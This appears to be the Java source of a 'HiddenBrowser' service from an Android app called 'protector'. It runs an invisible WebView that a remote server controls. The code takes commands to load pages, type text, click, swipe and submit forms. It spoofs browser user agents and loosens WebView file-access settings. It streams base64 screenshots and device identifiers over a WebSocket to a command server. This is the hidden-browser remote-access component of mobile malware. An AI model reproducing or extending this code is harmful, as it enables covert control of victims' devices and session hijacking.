package com.icontrol.protector;


import static com.icontrol.protector.Consts.URL_SOCKT;

import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.Point;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Base64;
import android.view.MotionEvent;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.annotation.Nullable;


import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.net.URI;
import java.util.regex.Pattern;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class HiddenBrowser extends Service {
    private WebView mWebView;
    private boolean CanCapture = false;

    private static HiddenBrowser instance;

    private WebSocket websocketfile; // Reusable WebSocket
    private OkHttpClient client;

    public static HiddenBrowser getinstance() {
        return instance;
    }
    private static int Notifi_ID = 111;
    private void startforground(Context ctx) {
        try{
           // int Notifi_ID = UtliTools.randomnumber(11111, 88888);
            MyNotification MyNotifiint = MyNotification.getInstance(ctx);
            Notification notification = MyNotifiint.createNotification(ctx);
            if (Build.VERSION.SDK_INT >= 34) {
                this.startForeground(Notifi_ID, notification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                this.startForeground(Notifi_ID, notification);
            }
        }catch (Exception a){}


    }

    public void controlbrowser(String[] args, Context ctx) {
        String command = args[0];
        Handler Mhandler = new Handler(ctx.getMainLooper());
        switch (command) {
            case "enter":
                Mhandler.postDelayed(new Runnable() {
                    public void run() {
                        try {
                            //newurl
                            mWebView.evaluateJavascript(
                                    "if (document.activeElement.form) { " +
                                            "  document.activeElement.form.submit(); " +
                                            "} else { " +
                                            "  var keydownEvent = new KeyboardEvent('keydown', {key: 'Enter', keyCode: 13, which: 13}); " +
                                            "  document.activeElement.dispatchEvent(keydownEvent); " +
                                            "  var keyupEvent = new KeyboardEvent('keyup', {key: 'Enter', keyCode: 13, which: 13}); " +
                                            "  document.activeElement.dispatchEvent(keyupEvent); " +
                                            "  var searchButton = document.querySelector(\"input[name='btnK'], button[type='submit']\"); " +
                                            "  if (searchButton) { searchButton.click(); } " +
                                            "}",
                                    null
                            );

                        } catch (Exception d) {

                        }
                    }
                }, 1);

                break;
            case "load":
                String newurl = args[1];
                Mhandler.postDelayed(new Runnable() {
                    public void run() {
                        try {
                            //newurl
                            mWebView.loadUrl(newurl);

                        } catch (Exception d) {

                        }
                    }
                }, 1);
            break;
            case "text":
                //text<:CS:>hello<:CS:>
                String text = args[1];

                Mhandler.postDelayed(new Runnable() {
                    public void run() {
                        try {
                            mWebView.evaluateJavascript("document.activeElement.value = '" + text + "';", null);

                        } catch (Exception d) {

                        }
                    }
                }, 1);
                break;
            case "scroll":
                //scroll<:CS:>Y<:CS:>
              //  int deltaY = Integer.valueOf(args[1]);

                String coordinates = args[1]; // Example pointString

                // Split the string by colon to get each point string
                String[] tokens = coordinates.split(Pattern.quote(":"));
                Point[] movements = new Point[tokens.length];

                for (int i = 0; i < tokens.length; i++) {
                    try {
                        // Remove parentheses and split by comma
                        String[] coordinateArray = tokens[i].replace("(", "").replace(")", "").split(", ");
                        int x = Integer.parseInt(coordinateArray[0]);
                        int y = Integer.parseInt(coordinateArray[1]);

                        // Create a new Point object and store it in the array
                        movements[i] = new Point(x, y);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }


                Mhandler.postDelayed(new Runnable() {
                    public void run() {
                        try {
                           // mWebView.evaluateJavascript("document.documentElement.scrollBy(0, " + deltaY + ");", null);
                            simulateSwipe(movements,1500);
                        } catch (Exception d) {

                        }
                    }
                }, 1);
                break;
            case "click":

                int x = Integer.valueOf(args[1]);
                int y = Integer.valueOf(args[2]);

                Mhandler.postDelayed(new Runnable() {
                    public void run() {
                        try {
                            simulateClick(x, y);
                        } catch (Exception d) {

                        }
                    }
                }, 1);


                break;
            case "nav"://navigate

                int isback = Integer.valueOf(args[1]);
                Mhandler.postDelayed(new Runnable() {
                    public void run() {
                        try {
                            if (isback == 2) {
                                mWebView.loadUrl("javascript:window.location.reload(true)");
                            } else if (isback == 1) {
                                if (mWebView.canGoForward()) {
                                    mWebView.goForward();
                                }
                            } else if (isback == 0) {
                                if (mWebView.canGoBack()) {
                                    mWebView.goBack();
                                }
                            }
                        } catch (Exception d) {

                        }
                    }
                }, 1);

                break;
        }
    }

    private void simulateClick(float x, float y) {
        long downTime = SystemClock.uptimeMillis();
        long eventTime = SystemClock.uptimeMillis();
        MotionEvent.PointerProperties[] properties = new MotionEvent.PointerProperties[1];
        MotionEvent.PointerProperties pp1 = new MotionEvent.PointerProperties();
        pp1.id = 0;
        pp1.toolType = MotionEvent.TOOL_TYPE_FINGER;
        properties[0] = pp1;
        MotionEvent.PointerCoords[] pointerCoords = new MotionEvent.PointerCoords[1];
        MotionEvent.PointerCoords pc1 = new MotionEvent.PointerCoords();
        pc1.x = x;
        pc1.y = y;
        pc1.pressure = 1;
        pc1.size = 1;
        pointerCoords[0] = pc1;
        MotionEvent motionEvent = MotionEvent.obtain(downTime, eventTime,
                MotionEvent.ACTION_DOWN, 1, properties,
                pointerCoords, 0, 0, 1, 1, 0, 0, 0, 0);
        mWebView.dispatchTouchEvent(motionEvent);

        motionEvent = MotionEvent.obtain(downTime, eventTime,
                MotionEvent.ACTION_UP, 1, properties,
                pointerCoords, 0, 0, 1, 1, 0, 0, 0, 0);
        mWebView.dispatchTouchEvent(motionEvent);
    }

    public void simulateSwipe(Point[] points, long duration) {
        long durationPerPoint = duration / (points.length - 1);
        long downTime = SystemClock.uptimeMillis();
        long eventTime = downTime;

        // Inject ACTION_DOWN at the start
        MotionEvent downEvent = MotionEvent.obtain(
                downTime, eventTime, MotionEvent.ACTION_DOWN,
                points[0].x, points[0].y, 0
        );
        mWebView.dispatchTouchEvent(downEvent);

        // Inject ACTION_MOVE events
        for (int i = 1; i < points.length; i++) {
            eventTime += durationPerPoint;

            MotionEvent moveEvent = MotionEvent.obtain(
                    downTime, eventTime, MotionEvent.ACTION_MOVE,
                    points[i].x, points[i].y, 0
            );
            mWebView.dispatchTouchEvent(moveEvent);
        }

        // Inject ACTION_UP at the end of the swipe
        eventTime += durationPerPoint;
        MotionEvent upEvent = MotionEvent.obtain(
                downTime, eventTime, MotionEvent.ACTION_UP,
                points[points.length - 1].x, points[points.length - 1].y, 0
        );
        mWebView.dispatchTouchEvent(upEvent);

        // Inject a new ACTION_DOWN at the final point to simulate stopping
        long stopDownTime = SystemClock.uptimeMillis();
        MotionEvent stopDownEvent = MotionEvent.obtain(
                stopDownTime, stopDownTime, MotionEvent.ACTION_DOWN,
                points[points.length - 1].x, points[points.length - 1].y, 0
        );
        mWebView.dispatchTouchEvent(stopDownEvent);

        // Hold for a brief moment to simulate touch
        try {
            Thread.sleep(100);  // Hold down for 100ms, adjust if needed
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        // Inject an ACTION_UP to lift the "finger"
        long stopUpTime = SystemClock.uptimeMillis();
        MotionEvent stopUpEvent = MotionEvent.obtain(
                stopDownTime, stopUpTime, MotionEvent.ACTION_UP,
                points[points.length - 1].x, points[points.length - 1].y, 0
        );
        mWebView.dispatchTouchEvent(stopUpEvent);

        // Recycle the events to avoid memory leaks
        downEvent.recycle();
        upEvent.recycle();
        stopDownEvent.recycle();
        stopUpEvent.recycle();
    }



    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        startforground(getApplicationContext());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            if (intent.hasExtra("starturl")) {
                client = new OkHttpClient();
                String starturl = intent.getStringExtra("starturl");
                String useragent = intent.getStringExtra("ua");
                instance = this;
                startforground(getApplicationContext());
                startWebViewInBackground(starturl,useragent);
                return START_STICKY;
            }
        } catch (Exception a) {
            a.printStackTrace();
        }
        return START_NOT_STICKY;
    }

    private void startWebViewInBackground(String starturl,String useragent) {
        // WebView logic goes here
        mWebView = new WebView(this);
        mWebView.getSettings().setJavaScriptEnabled(true);
        try{
            CookieManager.getInstance().setAcceptCookie(true);
            CookieManager.getInstance().setAcceptThirdPartyCookies(mWebView, true);
        }catch (Exception a){

        }
        mWebView.getSettings().setLoadsImagesAutomatically(true);
        mWebView.getSettings().setLoadWithOverviewMode(true);
        mWebView.getSettings().setUseWideViewPort(true);
        mWebView.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
        mWebView.getSettings().setAllowFileAccess(true);
        mWebView.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
        mWebView.getSettings().setDomStorageEnabled(true);
        mWebView.getSettings().setAllowFileAccessFromFileURLs(true);
        mWebView.getSettings().setAllowUniversalAccessFromFileURLs(true);
        mWebView.getSettings().setAllowContentAccess(true);
        try {
            mWebView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
            mWebView.getSettings().setPluginState(WebSettings.PluginState.ON);
            mWebView.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
            mWebView.setBackgroundColor(0xffffffff);
        } catch (Exception a) {
        }

        mWebView.getSettings().setBuiltInZoomControls(false);


        if(useragent.equals("a")){
            if (starturl.contains("google.com") || starturl.contains("youtube.com")) {

                mWebView.getSettings().setUserAgentString("Mozilla/5.0 (Linux; Android 13; Redmi Note 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.187 Mobile Safari/537.36");

            } else {
                mWebView.getSettings().setUserAgentString("Mozilla/5.0 (Linux; Android 13; SM-A146P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.5845.187 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.39.113;]");
            }

        }else if (useragent.startsWith("<c>")){
            String customagent = useragent.replace("<c>","");
            mWebView.getSettings().setUserAgentString(customagent);
        }else {
            //m or null
            String ua= mWebView.getSettings().getUserAgentString();
            mWebView.getSettings().setUserAgentString(ua);
        }
       // mWebView.getSettings().setUserAgentString("Mozilla/5.0 (Linux; Android 13; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.89 Mobile Safari/537.36");



        mWebView.setWebChromeClient(new MyChrome());
        mWebView.setWebViewClient(new MyWebViewClient());

        mWebView.measure(View.MeasureSpec.makeMeasureSpec(720, View.MeasureSpec.EXACTLY),
                View.MeasureSpec.makeMeasureSpec(1280, View.MeasureSpec.EXACTLY));
        mWebView.layout(0, 0, mWebView.getMeasuredWidth(), mWebView.getMeasuredHeight());

        mWebView.loadUrl(starturl);

        if (!isRemotethreadlive()) {
            RemoteLive(getApplicationContext());
        }
    }

    public Bitmap captureWebView(WebView webView) {
        // Create a Bitmap with the dimensions of the WebView


//        Bitmap bitmap = Bitmap.createBitmap(webView.getWidth(), webView.getHeight(), Bitmap.Config.ARGB_8888);
//
//        // Render the WebView to the Bitmap
//        Canvas canvas = new Canvas(bitmap);
//        webView.draw(canvas);

        mWebView.setDrawingCacheEnabled(true);
        Bitmap b = Bitmap.createScaledBitmap(mWebView.getDrawingCache(false),720,1280,false);
        mWebView.setDrawingCacheEnabled(false);

        return b;
    }

    private static volatile long remotethread = 0;

    private static boolean isRemotethreadlive() {
        if (remotethread == 0) {
            return false;
        }
        long currentTime = System.currentTimeMillis();
        long elapsedTime = currentTime - remotethread;
        long lasttime = 30 * 1000; // 30 sec in milliseconds


        return elapsedTime < lasttime;
    }

    public void StopRemoteThread(Context ctx) {
        MySettings.WriteBool(ctx, Consts.Hidden_browser, false);
        remotethread = 0;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        closeWebSocket();
    }

    public String lastimg = "";

    public void RemoteLive(Context ctx) {
        Thread thread = new Thread(new Runnable() {
            public void run() {

                do {
                    remotethread = System.currentTimeMillis();
                    try {
                        Thread.sleep(100);
                    } catch (Exception s) {
                    }

                    try {

                        if (!CanCapture) {
                            continue;
                        }

                        Bitmap screenshot = captureWebView(mWebView);


                        Bitmap compressedBitmap = Bitmap.createScaledBitmap(screenshot, 350, 650, true);
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        compressedBitmap.compress(Bitmap.CompressFormat.WEBP, 70, baos);
                        byte[] scbyts = baos.toByteArray();
                        String base64Image = Base64.encodeToString(scbyts, Base64.DEFAULT);

                        if (!lastimg.equals(base64Image)) {
                            lastimg = base64Image;

                            JSONObject jsonObject = new JSONObject();
                            jsonObject.put("type", "wbbrow");
                            jsonObject.put("img", base64Image);
                            jsonObject.put("cuz", "h");
                            String jsonData = jsonObject.toString();

                            Sendimg(ctx,jsonData);


                        }


                    } catch (Exception a) {
                        // a.printStackTrace();
                        MyLoger.Error("RemoteLive", a.getMessage());
                    }


                } while (MySettings.ReadBool(ctx, Consts.Hidden_browser, false));
            }
        });
        thread.start();
    }
    private void Sendimg(Context ctx, String msg) {
        if (websocketfile == null) {
            Request request = new Request.Builder().url(URL_SOCKT()).build();

            websocketfile = client.newWebSocket(request, new WebSocketListener() {
                @Override
                public void onOpen(WebSocket webSocket, Response response) {
                    // Connection established, send the message
                    sendWebSocketMessage(ctx, msg);
                }

                @Override
                public void onMessage(WebSocket webSocket, String text) {
                    // Handle server response if necessary
                    try{
                        JSONObject Response = new JSONObject(text);
                        String msgtype = Response.optString("type","empty");
                        if(msgtype.equals("stop") || msgtype.equals("Unauthorized access")){
                            websocketfile = null; // Set to null so it can be reconnected
                            client.dispatcher().executorService().shutdown();
                            StopRemoteThread(ctx);
                        }
                    }catch (Exception a){}
                }

                @Override
                public void onClosed(WebSocket webSocket, int code, String reason) {
                    websocketfile = null; // Set to null so it can be reconnected
                    client.dispatcher().executorService().shutdown();
                }

                @Override
                public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                    t.printStackTrace();
                    websocketfile = null; // In case of failure, reset the WebSocket to null
                }
            });
        } else {
            // If WebSocket is already open, send the message directly
            sendWebSocketMessage(ctx, msg);
        }
    }
    private void sendWebSocketMessage(Context ctx, String msg) {
        try {
            String Myid = MySettings.Read(ctx, Consts.DEVICE_ID, "Deviceid");
            String IDF = MySettings.Read(ctx, Consts.THE_IDF, null);
            if (Myid == null || IDF == null) {
                websocketfile.close(1000, "Missing ID");
                return;
            }
            String CIP = MySettings.Read(ctx, Consts.THE_CIP, "null");

            JSONObject message = new JSONObject();
            // message.put("userId", userid);
            message.put("idf", IDF);
            message.put("pid", Myid);
            message.put("itype", "Slr_client");
            message.put("subc", "msg");
            message.put("msg", msg);
            message.put("cip", CIP);
            String conctkey = MySettings.Read(ctx,Consts.Redirect_k,My_Configs.CONS_KY);
            message.put("conk", conctkey);

            websocketfile.send(message.toString());
        } catch (Exception e) {
            e.printStackTrace();
            if (websocketfile != null) {
                websocketfile.close(1000, "Error during message sending");
            }
        }
    }
    public void closeWebSocket() {
        if (websocketfile != null) {
            websocketfile.close(1000, "Closing WebSocket");
            websocketfile = null;
        }
        if(client != null){
            client.dispatcher().cancelAll();
            client.connectionPool().evictAll();
            client.dispatcher().executorService().shutdown();
            client = null;
        }
    }
    public class MyChrome extends WebChromeClient {
        MyChrome() {
        }
    }

    private class MyWebViewClient extends WebViewClient {
        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            // TODO Auto-generated method stub

            super.onPageStarted(view, url, favicon);
            CanCapture = false;
        }

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
            // TODO Auto-generated method stub

            if (request != null && request.getUrl() != null) {
                String url = request.getUrl().toString();
                if (!url.startsWith("http") && url.contains("://")) {
                    try {

                        URI uri = new URI(url);
                        String newUrl = uri.getHost() + uri.getPath();
                        CanCapture = false;
                        mWebView.loadUrl(newUrl);
                        return true; // URL handled
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }


            return false;

        }

        @Override
        public void onReceivedError(WebView view, int errorCode,
                                    String description, String failingUrl) {

        }

        @Override
        public void onPageFinished(WebView view, String url) {
            // TODO Auto-generated method stub

            super.onPageFinished(view, url);
            CanCapture = true;
            //  progressBar.setVisibility(View.GONE);
        }


    }

}
